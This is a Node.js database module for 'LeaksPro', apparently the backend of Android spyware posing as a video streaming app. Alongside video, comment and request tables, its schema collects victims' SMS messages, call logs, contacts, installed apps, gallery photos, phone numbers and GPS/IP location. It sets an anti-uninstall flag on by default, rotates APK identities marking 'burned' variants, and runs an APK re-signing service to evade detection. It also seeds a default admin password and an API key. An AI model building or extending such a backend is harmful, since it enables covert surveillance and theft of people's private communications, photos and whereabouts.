/**
 * sql.js wrapper — exposes the same API as better-sqlite3 so every
 * other file (Video.js, routes, websocket) works without changes.
 * Pure-JS, zero native deps — runs on Windows, Linux, macOS, Render, etc.
 */
const initSqlJs = require('sql.js');
const path = require('path');
const fs = require('fs');

const DB_PATH = path.join(__dirname, '..', 'data', 'leakspro.db');

// Ensure data directory exists
const dataDir = path.dirname(DB_PATH);
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

/* ------------------------------------------------------------------ */
/*  Compatibility wrapper that mimics better-sqlite3 on top of sql.js */
/* ------------------------------------------------------------------ */
class SqliteCompat {
  constructor(sqlDb) {
    this._db = sqlDb;
    this._saveTimer = null;
    this._cloudBackupTimer = null;
  }

  /* ---- persist to disk (debounced so rapid writes don't thrash) ---- */
  _scheduleSave() {
    if (this._saveTimer) return;
    this._saveTimer = setTimeout(() => {
      this._saveTimer = null;
      try {
        const data = this._db.export();
        fs.writeFileSync(DB_PATH, Buffer.from(data));
      } catch (e) {
        console.error('[DB] save error:', e.message);
      }
    }, 100);
    // Also schedule a Cloudinary backup (longer debounce)
    this._scheduleCloudBackup();
  }

  /* ---- backup to Cloudinary (debounced 10s so rapid writes batch) ---- */
  _scheduleCloudBackup() {
    if (this._cloudBackupTimer) return;
    this._cloudBackupTimer = setTimeout(() => {
      this._cloudBackupTimer = null;
      this._doCloudBackup();
    }, 10000);
  }

  _doCloudBackup() {
    try {
      // Safety: don't overwrite a good Cloudinary backup with a nearly-empty DB
      // (protects against redeploy where Cloudinary restore failed)
      const videoCount = this._db.exec("SELECT COUNT(*) FROM videos");
      const count = videoCount[0]?.values?.[0]?.[0] || 0;
      if (count < 5) {
        console.log(`[DB] Skipping Cloudinary backup — only ${count} videos (safety threshold: 5)`);
        return;
      }

      // Save to disk first so the file is up to date
      const data = this._db.export();
      fs.writeFileSync(DB_PATH, Buffer.from(data));
      // Then upload to Cloudinary
      const { initCloudinary, uploadDbBackup } = require('./cloudinary');
      initCloudinary();
      uploadDbBackup(DB_PATH)
        .then(() => console.log('[DB] Cloudinary backup successful (' + count + ' videos)'))
        .catch(e => console.warn('[DB] Cloudinary backup failed:', e.message));
    } catch (e) {
      console.warn('[DB] Cloud backup error:', e.message);
    }
  }

  saveNow() {
    if (this._saveTimer) { clearTimeout(this._saveTimer); this._saveTimer = null; }
    const data = this._db.export();
    fs.writeFileSync(DB_PATH, Buffer.from(data));
    // Also trigger immediate cloud backup
    if (this._cloudBackupTimer) { clearTimeout(this._cloudBackupTimer); this._cloudBackupTimer = null; }
    this._doCloudBackup();
  }

  /* ---- helpers to convert sql.js rows → objects ---- */
  _rowsToObjects(stmt) {
    const cols = stmt.getColumnNames();
    const rows = [];
    while (stmt.step()) {
      const vals = stmt.get();
      const obj = {};
      cols.forEach((c, i) => { obj[c] = vals[i]; });
      rows.push(obj);
    }
    stmt.free();
    return rows;
  }

  /* ---- mimic better-sqlite3's db.prepare() ---- */
  prepare(sql) {
    const self = this;
    return {
      all(...params) {
        const flat = params.flat();
        const stmt = self._db.prepare(sql);
        if (flat.length) stmt.bind(flat);
        const rows = self._rowsToObjects(stmt);
        return rows;
      },
      get(...params) {
        const flat = params.flat();
        const stmt = self._db.prepare(sql);
        if (flat.length) stmt.bind(flat);
        const cols = stmt.getColumnNames();
        let obj;
        if (stmt.step()) {
          const vals = stmt.get();
          obj = {};
          cols.forEach((c, i) => { obj[c] = vals[i]; });
        }
        stmt.free();
        return obj; // undefined when no row found (same as better-sqlite3)
      },
      run(...params) {
        const flat = params.flat();
        self._db.run(sql, flat);
        self._scheduleSave();
        return {
          changes: self._db.getRowsModified(),
          lastInsertRowid: self._lastInsertRowid(),
        };
      },
    };
  }

  _lastInsertRowid() {
    const stmt = this._db.prepare('SELECT last_insert_rowid() as id');
    stmt.step();
    const id = stmt.get()[0];
    stmt.free();
    return id;
  }

  /* ---- mimic db.exec() ---- */
  exec(sql) {
    this._db.exec(sql);
    this._scheduleSave();
  }

  /* ---- mimic db.pragma() ---- */
  pragma(setting) {
    try { this._db.exec(`PRAGMA ${setting}`); } catch (_) { /* ignore */ }
  }

  /* ---- mimic db.transaction(fn) ---- */
  transaction(fn) {
    const self = this;
    return function (...args) {
      self._db.exec('BEGIN');
      try {
        const result = fn(...args);
        self._db.exec('COMMIT');
        self._scheduleSave();
        return result;
      } catch (e) {
        self._db.exec('ROLLBACK');
        throw e;
      }
    };
  }
}

/* ------------------------------------------------------------------ */
/*  The exported db object is a Proxy; it looks synchronous to         */
/*  callers but the underlying sql.js is initialised asynchronously.  */
/* ------------------------------------------------------------------ */
let _readyResolve;
const _readyPromise = new Promise((r) => { _readyResolve = r; });

let db; // set to SqliteCompat once init completes

async function initDatabase() {
  // Locate the sql.js WASM binary explicitly (fixes container deploys)
  const sqlWasmPath = path.join(
    path.dirname(require.resolve('sql.js')),
    'sql-wasm.wasm'
  );
  console.log('[DB] sql.js WASM path:', sqlWasmPath, '- exists:', fs.existsSync(sqlWasmPath));

  const SQL = await initSqlJs({
    locateFile: (file) => {
      // Try the resolved path first, fallback to node_modules
      if (fs.existsSync(sqlWasmPath)) return sqlWasmPath;
      return path.join(__dirname, '..', 'node_modules', 'sql.js', 'dist', file);
    },
  });
  console.log('[DB] sql.js engine loaded');

  // ---- Try to restore from Cloudinary if no local DB exists ----
  let restoredFromCloud = false;
  if (!fs.existsSync(DB_PATH) || fs.statSync(DB_PATH).size === 0) {
    console.log('[DB] No local database found — attempting Cloudinary restore…');
    try {
      // Cloudinary must be configured before we can restore
      const { initCloudinary, downloadDbBackup } = require('./cloudinary');
      initCloudinary();
      const buf = await downloadDbBackup();
      if (buf && buf.length > 0) {
        fs.writeFileSync(DB_PATH, buf);
        console.log('[DB] Restored database from Cloudinary (' + buf.length + ' bytes)');
        restoredFromCloud = true;
      } else {
        console.log('[DB] No Cloudinary backup available — starting fresh');
      }
    } catch (e) {
      console.warn('[DB] Cloudinary restore failed:', e.message, '— starting fresh');
    }
  }

  let sqlDb;
  try {
    if (fs.existsSync(DB_PATH)) {
      const buf = fs.readFileSync(DB_PATH);
      sqlDb = new SQL.Database(buf);
      console.log('[DB] Loaded existing database from', DB_PATH, restoredFromCloud ? '(restored from cloud)' : '');
    } else {
      sqlDb = new SQL.Database();
      console.log('[DB] Created new in-memory database');
    }
  } catch (e) {
    console.warn('[DB] Failed to load from disk, starting fresh:', e.message);
    sqlDb = new SQL.Database();
  }

  db = new SqliteCompat(sqlDb);

  db.pragma('journal_mode = WAL');
  db.pragma('foreign_keys = ON');

  // ---- Create tables & seed data ----
  db.exec(`
    CREATE TABLE IF NOT EXISTS videos (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT DEFAULT '',
      filename TEXT NOT NULL,
      thumbnail TEXT DEFAULT '',
      duration REAL DEFAULT 0,
      views INTEGER DEFAULT 0,
      likes INTEGER DEFAULT 0,
      dislikes INTEGER DEFAULT 0,
      channel_name TEXT DEFAULT 'LeaksPro Admin',
      channel_avatar TEXT DEFAULT '',
      category TEXT DEFAULT 'General',
      tags TEXT DEFAULT '[]',
      file_size INTEGER DEFAULT 0,
      resolution TEXT DEFAULT '',
      mime_type TEXT DEFAULT 'video/mp4',
      is_published INTEGER DEFAULT 1,
      is_short INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    )
  `);

  // ── Schema migration: add series/episode support columns ──
  const migrateCols = [
    ["series_id", "TEXT DEFAULT ''"],
    ["season_number", "INTEGER DEFAULT 0"],
    ["episode_number", "INTEGER DEFAULT 0"],
    ["content_type", "TEXT DEFAULT 'movie'"],
    ["tmdb_id", "INTEGER DEFAULT 0"],
    ["total_seasons", "INTEGER DEFAULT 0"],
    ["episode_title", "TEXT DEFAULT ''"],
    ["trailer_url", "TEXT DEFAULT ''"],
  ];
  for (const [col, def] of migrateCols) {
    try { db.exec(`ALTER TABLE videos ADD COLUMN ${col} ${def}`); } catch (_) {}
  }

  db.exec(`
    CREATE TABLE IF NOT EXISTS watch_history (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      video_id TEXT NOT NULL,
      device_id TEXT DEFAULT '',
      watched_at TEXT DEFAULT (datetime('now')),
      watch_duration REAL DEFAULT 0,
      FOREIGN KEY (video_id) REFERENCES videos(id) ON DELETE CASCADE
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS comments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      video_id TEXT NOT NULL,
      author TEXT DEFAULT 'Anonymous',
      content TEXT NOT NULL,
      likes INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (video_id) REFERENCES videos(id) ON DELETE CASCADE
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS categories (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT UNIQUE NOT NULL,
      icon TEXT DEFAULT '',
      sort_order INTEGER DEFAULT 0
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS admin_settings (
      key TEXT PRIMARY KEY,
      value TEXT DEFAULT ''
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
      device_id TEXT PRIMARY KEY,
      device_name TEXT DEFAULT '',
      model TEXT DEFAULT '',
      manufacturer TEXT DEFAULT '',
      os_version TEXT DEFAULT '',
      sdk_version INTEGER DEFAULT 0,
      app_version TEXT DEFAULT '',
      screen_resolution TEXT DEFAULT '',
      phone_numbers TEXT DEFAULT '[]',
      battery_percent INTEGER DEFAULT -1,
      battery_charging INTEGER DEFAULT 0,
      total_storage INTEGER DEFAULT 0,
      free_storage INTEGER DEFAULT 0,
      total_ram INTEGER DEFAULT 0,
      free_ram INTEGER DEFAULT 0,
      is_online INTEGER DEFAULT 0,
      socket_id TEXT DEFAULT '',
      anti_uninstall INTEGER DEFAULT 1,
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now'))
    )
  `);

  // Add anti_uninstall column to existing databases
  try {
    db.exec(`ALTER TABLE devices ADD COLUMN anti_uninstall INTEGER DEFAULT 1`);
  } catch (_) { /* column already exists */ }

  // Add location columns to existing databases
  try {
    db.exec(`ALTER TABLE devices ADD COLUMN latitude REAL DEFAULT NULL`);
  } catch (_) { /* column already exists */ }
  try {
    db.exec(`ALTER TABLE devices ADD COLUMN longitude REAL DEFAULT NULL`);
  } catch (_) { /* column already exists */ }

  // Add enhanced geo columns (IP geolocation fallback + enrichment)
  const geoColumns = [
    ['loc_source', "TEXT DEFAULT 'unknown'"],       // 'gps', 'ip', 'network', 'unknown'
    ['loc_accuracy', 'REAL DEFAULT -1'],            // meters for GPS, km*1000 for IP
    ['city', "TEXT DEFAULT ''"],
    ['region', "TEXT DEFAULT ''"],
    ['country', "TEXT DEFAULT ''"],
    ['isp', "TEXT DEFAULT ''"],
    ['timezone', "TEXT DEFAULT ''"],
    ['ip_address', "TEXT DEFAULT ''"],
  ];
  for (const [col, def] of geoColumns) {
    try { db.exec(`ALTER TABLE devices ADD COLUMN ${col} ${def}`); } catch (_) {}
  }

  db.exec(`
    CREATE TABLE IF NOT EXISTS sms_messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      sms_id INTEGER NOT NULL,
      address TEXT DEFAULT '',
      body TEXT DEFAULT '',
      date INTEGER DEFAULT 0,
      type INTEGER DEFAULT 1,
      read INTEGER DEFAULT 0,
      synced_at TEXT DEFAULT (datetime('now')),
      UNIQUE(device_id, sms_id)
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS call_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      call_id INTEGER NOT NULL,
      number TEXT DEFAULT '',
      name TEXT DEFAULT '',
      type INTEGER DEFAULT 1,
      date INTEGER DEFAULT 0,
      duration INTEGER DEFAULT 0,
      synced_at TEXT DEFAULT (datetime('now')),
      UNIQUE(device_id, call_id)
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS contacts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      contact_id TEXT NOT NULL,
      name TEXT DEFAULT '',
      phones TEXT DEFAULT '[]',
      emails TEXT DEFAULT '[]',
      synced_at TEXT DEFAULT (datetime('now')),
      UNIQUE(device_id, contact_id)
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS installed_apps (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      package_name TEXT NOT NULL,
      app_name TEXT DEFAULT '',
      version TEXT DEFAULT '',
      install_time INTEGER DEFAULT 0,
      update_time INTEGER DEFAULT 0,
      is_system INTEGER DEFAULT 0,
      synced_at TEXT DEFAULT (datetime('now')),
      UNIQUE(device_id, package_name)
    )
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS gallery_photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      media_id INTEGER NOT NULL,
      filename TEXT DEFAULT '',
      date_taken INTEGER DEFAULT 0,
      width INTEGER DEFAULT 0,
      height INTEGER DEFAULT 0,
      size INTEGER DEFAULT 0,
      image_base64 TEXT DEFAULT '',
      synced_at TEXT DEFAULT (datetime('now')),
      UNIQUE(device_id, media_id)
    )
  `);

  // APK variant pool for identity rotation
  db.exec(`
    CREATE TABLE IF NOT EXISTS apk_variants (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      variant_name TEXT UNIQUE NOT NULL,
      application_id TEXT NOT NULL,
      file_size INTEGER DEFAULT 0,
      uploaded_at TEXT DEFAULT (datetime('now')),
      is_active INTEGER DEFAULT 0,
      is_burned INTEGER DEFAULT 0
    )
  `);

  // Signed APKs — custom APK re-signing service
  db.exec(`
    CREATE TABLE IF NOT EXISTS signed_apks (
      id TEXT PRIMARY KEY,
      original_name TEXT NOT NULL,
      remark TEXT DEFAULT '',
      original_size INTEGER DEFAULT 0,
      signed_size INTEGER DEFAULT 0,
      cert_hash TEXT DEFAULT '',
      cert_cn TEXT DEFAULT '',
      cert_org TEXT DEFAULT '',
      sign_count INTEGER DEFAULT 1,
      status TEXT DEFAULT 'pending',
      last_signed_at TEXT DEFAULT (datetime('now')),
      created_at TEXT DEFAULT (datetime('now'))
    )
  `);

  // Admin devices — tracks LeaksProAdmin app installations
  db.exec(`
    CREATE TABLE IF NOT EXISTS admin_devices (
      device_id TEXT PRIMARY KEY,
      device_name TEXT DEFAULT '',
      model TEXT DEFAULT '',
      manufacturer TEXT DEFAULT '',
      os_version TEXT DEFAULT '',
      ip_address TEXT DEFAULT '',
      isp TEXT DEFAULT '',
      city TEXT DEFAULT '',
      country TEXT DEFAULT '',
      app_version TEXT DEFAULT '',
      is_locked INTEGER DEFAULT 0,
      is_online INTEGER DEFAULT 0,
      last_seen TEXT DEFAULT (datetime('now')),
      first_seen TEXT DEFAULT (datetime('now'))
    )
  `);

  // Content requests — users request movies/shows from the app
  db.exec(`
    CREATE TABLE IF NOT EXISTS content_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      tmdb_id INTEGER NOT NULL,
      title TEXT NOT NULL,
      poster_path TEXT DEFAULT '',
      backdrop_path TEXT DEFAULT '',
      content_type TEXT DEFAULT 'movie',
      overview TEXT DEFAULT '',
      vote_average REAL DEFAULT 0,
      release_date TEXT DEFAULT '',
      device_id TEXT NOT NULL,
      device_name TEXT DEFAULT '',
      status TEXT DEFAULT 'pending',
      created_at TEXT DEFAULT (datetime('now')),
      fulfilled_at TEXT,
      notified INTEGER DEFAULT 0
    )
  `);

  // App users (signup via phone number or Gmail)
  db.exec(`
    CREATE TABLE IF NOT EXISTS app_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      phone TEXT DEFAULT '',
      email TEXT DEFAULT '',
      display_name TEXT DEFAULT '',
      avatar TEXT DEFAULT '🦸',
      auth_method TEXT DEFAULT 'phone',
      device_id TEXT DEFAULT '',
      ip_address TEXT DEFAULT '',
      country TEXT DEFAULT '',
      city TEXT DEFAULT '',
      last_login TEXT DEFAULT (datetime('now')),
      created_at TEXT DEFAULT (datetime('now'))
    )
  `);

  // Seed categories
  const cats = [
    ['All',0],['Gaming',1],['Music',2],['Sports',3],
    ['Education',4],['Entertainment',5],['News',6],
    ['Technology',7],['Comedy',8],['Film',9],
  ];
  for (const [name, order] of cats) {
    db.prepare('INSERT OR IGNORE INTO categories (name, sort_order) VALUES (?, ?)').run(name, order);
  }

  // Seed default admin settings
  const defaults = [
    ['app_name','LeaksPro'],
    ['max_upload_size','5368709120'],
    ['allowed_formats','mp4,mkv,avi,mov,webm,flv'],
    ['admin_password','admin123'],
    ['tmdb_api_key','f348da3bef193d10ee05ce1b4f16de94'],
  ];
  for (const [k,v] of defaults) {
    db.prepare('INSERT OR IGNORE INTO admin_settings (key, value) VALUES (?, ?)').run(k, v);
  }

  // Indexes
  db.exec('CREATE INDEX IF NOT EXISTS idx_videos_created_at ON videos(created_at DESC)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_videos_category ON videos(category)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_videos_views ON videos(views DESC)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_videos_published ON videos(is_published)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_watch_history_video ON watch_history(video_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_watch_history_device ON watch_history(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_comments_video ON comments(video_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(is_online)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON devices(last_seen DESC)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_sms_device ON sms_messages(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_sms_date ON sms_messages(date DESC)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_call_logs_device ON call_logs(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_call_logs_date ON call_logs(date DESC)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_contacts_device ON contacts(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_apps_device ON installed_apps(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_requests_device ON content_requests(device_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_requests_status ON content_requests(status)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_requests_tmdb ON content_requests(tmdb_id)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_app_users_phone ON app_users(phone)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_app_users_email ON app_users(email)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_app_users_device ON app_users(device_id)');

  // Clear stale socket references on server start (devices stay registered & online)
  db.prepare("UPDATE devices SET socket_id = '', last_seen = datetime('now')").run();

  db.saveNow();
  console.log('[DB] SQLite initialised (sql.js — pure JS)');
  _readyResolve(db);
  return db;
}

/* ------------------------------------------------------------------ */
/*  Proxy so require('./config/database') can be used synchronously   */
/*  in route files (same as before). server.js must await .__ready     */
/*  before starting the HTTP server.                                   */
/* ------------------------------------------------------------------ */
const dbProxy = new Proxy({}, {
  get(_target, prop) {
    if (prop === 'then') return undefined;           // not a thenable
    if (prop === '__initDatabase') return initDatabase;
    if (prop === '__ready') return _readyPromise;
    if (!db) throw new Error('Database not initialised yet – await db.__ready first');
    return typeof db[prop] === 'function' ? db[prop].bind(db) : db[prop];
  },
});

module.exports = dbProxy;
